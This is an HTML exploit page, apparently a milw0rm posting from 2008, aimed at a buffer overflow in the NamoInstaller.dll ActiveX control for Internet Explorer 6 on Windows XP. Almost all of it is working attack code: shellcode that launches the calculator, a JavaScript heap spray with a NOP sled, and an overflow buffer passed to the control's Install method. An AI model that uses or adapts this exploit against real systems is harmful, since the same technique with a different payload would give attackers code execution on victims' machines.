<!-- 
Sejoong Namo ActiveSquare6 NamoInstaller.dll BoF Exploit

Written by http://www.Plan-S.cn
Tested on Windows XP SP2(fully patched) Korean, IE6, NamoInstaller.dll version 3,0,0,1 
-->


<html>
<object classid="clsid:AF465549-1D22-4140-A273-386FA8877E0A" id="target"></OBJECT>

<SCRIPT language="JavaScript">
// HeapSpray - execute calculator	
	shellcode = unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");    
	bigblock = unescape("%u9090%u9090");    
    headersize = 20;    
    slackspace = headersize+shellcode.length
    while (bigblock.length<slackspace) bigblock+=bigblock;
    fillblock = bigblock.substring(0, slackspace);
    block = bigblock.substring(0, bigblock.length-slackspace);
    while(block.length+slackspace<0x40000) block = block+block+fillblock;    
	memory = new Array();
    for (i=0;i<800;i++) memory[i] = block + shellcode;

	var buffer =  unescape("%u0A0A%u0A0A");
	while (buffer.length< 2310) buffer+=unescape("%u0A0A%u0A0A");
	
	buffer += unescape("%uE0CC%u0012");
	buffer += unescape("%u0A0A%u0A0A");

// Vulnerability of method Install
	target.Install(buffer);			

</script>
</html>

# milw0rm.com [2008-02-03]
